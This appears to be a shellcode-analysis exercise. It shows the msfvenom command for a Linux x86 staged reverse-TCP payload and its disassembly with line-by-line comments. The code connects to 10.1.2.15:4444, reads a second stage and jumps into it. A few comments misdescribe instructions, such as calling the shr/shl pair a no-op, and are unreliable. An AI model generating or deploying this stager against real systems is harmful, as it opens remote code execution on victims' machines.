@@ -1,0 +1,56 @@
+msfvenom -p  linux/x86/shell/reverse_tcp -f raw LHOST=10.1.2.15 | ndisasm -u -
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+00000000  31DB              xor ebx,ebx                 ;zero out ebx
+00000002  F7E3              mul ebx                     ;zero out eax, edx
+00000004  53                push ebx                    ;push 0 on stack
+00000005  43                inc ebx                     ;ebx=1
+00000006  53                push ebx                    ;push 1 on stack
+00000007  6A02              push byte +0x2              ;push 2 on stack
+00000009  B066              mov al,0x66                 ;EAX=0x66
+0000000B  89E1              mov ecx,esp                 ;ECX points to stack
+0000000D  CD80              int 0x80                    ;syscall sys_socket(1,*args)
+                                                        ;*args(AF_INET, SOCK_STREAM, IPPROTO_IP)
+
+0000000F  97                xchg eax,edi                ;store socket file descriptor in edi
+00000010  5B                pop ebx                     ;EBX=2
+00000011  680A01020F        push dword 0xf02010a        ;push ip address in stack, reverse byte order
+00000016  680200115C        push dword 0x5c110002       ;push port (reversed) and 0002 on stack
+0000001B  89E1              mov ecx,esp                 ;store pointer to stack on ECX (*args)
+0000001D  6A66              push byte +0x66             ;push on stack 0x66
+0000001F  58                pop eax                     ;pop 0x66 from stack, store in EAX
+00000020  50                push eax                    ;push 0x66 on stack
+00000021  51                push ecx                    ;push *args on stack
+00000022  57                push edi                    ;push socket fd on stack
+00000023  89E1              mov ecx,esp                 ;store stack pointer to ECX (**args)
+00000025  43                inc ebx                     ;EBX=3
+00000026  CD80              int 0x80                    ;syscall sys_connect(fd, **args)
+                                                        ;**args=(socketfd, *args, 0x66)
+                                                        ;*args=(2, port, ipaddress)
+
+00000028  B207              mov dl,0x7                  ;EDX=7
+0000002A  B900100000        mov ecx,0x1000              ;ECX=0x1000 (4096)
+0000002F  89E3              mov ebx,esp                 ;store pointer of stack in EBX
+00000031  C1EB0C            shr ebx,0xc                 ;two instructions that negate each other
+00000034  C1E30C            shl ebx,0xc                 ;i.e. nothing will happen in EBX contents
+00000037  B07D              mov al,0x7d                 ;EAX=0x7d (125, mprotect)
+00000039  CD80              int 0x80                    ;syscall
+
+0000003B  5B                pop ebx                     ;store EBX value on stack (current stack pointer)
+0000003C  89E1              mov ecx,esp                 ;store stack pointer in ECX
+0000003E  99                cdq                         ;convert double to quad
+                                                        ;sign extend EAX, into EDX:EAX
+                                                        ;this effectively zeroes out EDX, since
+                                                        ;EAX is already zero, providing the connect was
+                                                        ;sucessful.
+0000003F  B60C              mov dh,0xc                  ;EDX=0xc00 (3072)
+00000041  B003              mov al,0x3                  ;EAX=3 syscall for read
+                                                        ;read (socket fd,
+                                                        ;pointer to stack to store data,
+                                                        ;read up to 0xc00 bytes)
+00000043  CD80              int 0x80                    ;execute the call
+00000045  FFE1              jmp ecx                     ;pass execution to the data you got from
+                                                        ;remote end
+
+
